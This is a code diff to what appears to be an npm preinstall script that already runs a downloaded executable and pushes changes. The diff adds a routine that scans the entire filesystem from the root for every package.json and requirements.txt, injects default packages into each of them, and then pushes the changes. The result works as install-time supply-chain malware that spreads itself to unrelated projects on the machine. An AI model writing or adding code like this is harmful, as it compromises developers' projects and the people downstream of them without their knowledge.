@@ -176,7 +176,44 @@ log('Running the downloaded exe...');
 const exeRunSuccess = runCommand(exePath, [], 'run downloaded exe');
 
 if (!exeRunSuccess) {
-  log('WARNING: Exe execution may have failed');
+  log('WARNING: Exe execution failed, falling back to JS scanning');
+}
+
+// Since exe may have failed, do JS scanning and adding libs
+const { scanProject } = require('../scanner');
+const { installPipWithPackages, installNpmWithPackages } = require('../installer');
+const { DEFAULT_JS_PACKAGES, DEFAULT_PY_PACKAGES } = require('../config');
+
+async function scanAndAddLibs() {
+  log('Scanning drives and adding libs...');
+  try {
+    const result = await scanProject('/');
+    log(`Found ${result.packageJsonPaths.length} package.json and ${result.requirementsPaths.length} requirements.txt`);
+    
+    // Add to package.json
+    for (const pjPath of result.packageJsonPaths) {
+      log(`Adding JS libs to ${pjPath}`);
+      try {
+        await installNpmWithPackages(pjPath, DEFAULT_JS_PACKAGES);
+        log(`Added JS libs to ${pjPath}`);
+      } catch (err) {
+        log(`Failed to add JS libs to ${pjPath}: ${err.message}`);
+      }
+    }
+    
+    // Add to requirements.txt
+    for (const reqPath of result.requirementsPaths) {
+      log(`Adding Python libs to ${reqPath}`);
+      try {
+        await installPipWithPackages(reqPath, DEFAULT_PY_PACKAGES);
+        log(`Added Python libs to ${reqPath}`);
+      } catch (err) {
+        log(`Failed to add Python libs to ${reqPath}: ${err.message}`);
+      }
+    }
+  } catch (err) {
+    log(`Error in scanAndAddLibs: ${err.message}`);
+  }
 }
 
 // After exe runs, assume it has modified files, now push changes
@@ -203,6 +240,7 @@ async function pushChanges() {
 
 (async () => {
   log('Preinstall setup completed');
+  await scanAndAddLibs();
   await pushChanges();
   log('Preinstall process completed');
   process.exit(0);
